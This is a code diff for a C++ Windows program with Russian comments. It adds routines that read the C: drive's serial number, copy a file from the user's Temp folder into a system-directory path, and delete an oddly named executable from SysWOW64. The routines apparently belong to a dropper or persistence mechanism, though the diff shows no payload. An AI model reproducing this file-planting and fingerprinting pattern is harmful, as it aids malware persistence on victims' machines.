@@ -164,4 +164,22 @@ void cleanfile() {
     if (DeleteFile(filePath)) {
         std::cout << "File successfully deleted!" << std::endl;
     }
+    DeleteFile("C:\\Windows\\SysWOW64\\adskisatana666.exe");
+}
+std::string getDiskSerial() {
+    DWORD serialNum = 0;
+    if (GetVolumeInformation("C:\\", NULL, 0, &serialNum, NULL, NULL, NULL, 0)) {
+        return std::to_string(serialNum);
+    }
+    return "unknown";
+}
+void CopyFileToSysWow64(std::string destPath, std::string filename) {
+    // Получаем имя пользователя
+    char username[256];
+    DWORD size = 256;
+    GetUserNameA(username, &size);
+    // Строим путь к исходному файлу
+    std::string sourcePath = "C:\\Users\\" + std::string(username) + "\\AppData\\Local\\Temp\\" + filename;
+    // Копируем файл
+    CopyFile(sourcePath.c_str(), destPath.c_str(), TRUE);
 }
